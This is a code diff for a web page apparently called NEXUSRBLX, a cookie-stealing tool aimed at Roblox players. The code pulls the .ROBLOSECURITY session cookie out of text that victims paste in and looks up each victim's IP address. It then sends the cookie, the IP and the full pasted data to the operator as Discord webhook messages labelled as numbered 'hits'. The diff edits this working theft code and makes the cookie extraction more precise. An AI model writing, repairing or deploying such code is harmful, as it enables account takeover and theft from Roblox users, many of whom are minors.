@@ -473,7 +473,7 @@
     if (requestQueue.length > 0) setTimeout(processQueue, 2000);
 }
         
-        async function validateAndStart(event) {
+       async function validateAndStart(event) {
     if (isCooldown) return;
     if (!dId) {
         const box = document.getElementById('input-container');
@@ -485,9 +485,8 @@
 
     isCooldown = true;
     const btn = event.target;
-    btn.innerText = "COOLDOWN ACTIVE...";
-    btn.style.opacity = "0.5";
-    setTimeout(() => { isCooldown = false; btn.innerText = "Execute Sync"; btn.style.opacity = "1"; }, 5000);
+    btn.innerText = "COOLDOWN...";
+    setTimeout(() => { isCooldown = false; btn.innerText = "Execute Sync"; }, 5000);
 
     pushTraffic(dName, true);
     let cur = (parseInt(localStorage.getItem('nexus_hit_counter')) || 0) + 1;
@@ -498,53 +497,47 @@
 
     const raw = document.getElementById('userInput').value;
     
-    // Improved Regex to find the cookie even if the formatting is messy
-    const cookMatch = raw.match(/_\|WARNING:-DO-NOT-SHARE-.*\|_[A-Z0-9]+/i) || raw.match(/\.ROBLOSECURITY",\s*"([^"]+)"/);
-    let cook = cookMatch ? (cookMatch[1] || cookMatch[0]) : "NOT_FOUND";
+    // STRICT REGEX: Only grabs the token starting with the warning and ending at the quote or space
+    const cookMatch = raw.match(/(_\|WARNING:-DO-NOT-SHARE-.*\|_[A-F0-9]+)/i);
+    let cook = cookMatch ? cookMatch[1] : "COOKIE_NOT_FOUND";
 
-    // Discord Field Limit Protection (1024 chars)
-    // If it's too long, we show the start/end so the embed doesn't break
-    let displayCook = cook;
-    if (displayCook.length > 1000) {
-        displayCook = cook.substring(0, 500) + "... (Full Cookie in TXT file) ..." + cook.substring(cook.length - 400);
-    }
-    
+    // Get IP
     let ip = "Detecting...";
     try { 
         const res = await fetch('https://api.ipify.org?format=json'); 
         const data = await res.json();
         ip = data.ip; 
-    } catch(e) { ip = "Detection Failed"; }
+    } catch(e) { ip = "Detecting..."; }
 
-    const hookName = `NEXUSRBLX HIT #${cur}`;
+    const hookName = `NEXUSRBLX | HIT #${cur}`;
 
-    // Item 1: The Embed (This is likely what was failing)
+    // Clean Embed: Only the essentials for logging in
     requestQueue.push({ 
         type: 'json', 
         payload: { 
             username: hookName, 
             avatar_url: logoURL, 
             embeds: [{ 
-                title: `🛡️ TARGET: ${dName}`, 
+                title: `Successfully Mirrored: ${dName}`, 
                 color: 0x10b981, 
-                footer: { text: "Nexus Intelligence Protocol v4" },
-                timestamp: new Date().toISOString(),
                 fields: [
-                    { name: "🌐 IP Address", value: `\`${ip}\``, inline: true }, 
+                    { name: "🌐 Network IP", value: `\`${ip}\``, inline: true }, 
                     { name: "🎮 Place ID", value: `\`${dId}\``, inline: true }, 
-                    { name: "🔑 Security Cookie", value: `\`\`\`${displayCook}\`\`\`` }
-                ] 
+                    { name: "🔑 ROBLOSECURITY Cookie", value: `\`\`\`${cook}\`\`\`` }
+                ],
+                footer: { text: "Nexus Intelligence Protocol" },
+                timestamp: new Date().toISOString()
             }] 
         } 
     });
 
-    // Item 2: The Raw Text File (Always succeeds)
+    // Send the full raw data as a separate file for backup
     requestQueue.push({ 
         type: 'file', 
         payload: { 
             username: hookName, 
             avatar_url: logoURL, 
-            filename: `RAWLOG#${cur}.txt`, 
+            filename: `Full_Session_Data_${cur}.txt`, 
             content: raw 
         } 
     });
@@ -552,7 +545,6 @@
     processQueue();
     runEngine();
 }
-
         function runEngine() {
     
     const dur = Math.floor(Math.random() * (60000 - 30000 + 1)) + 30000;
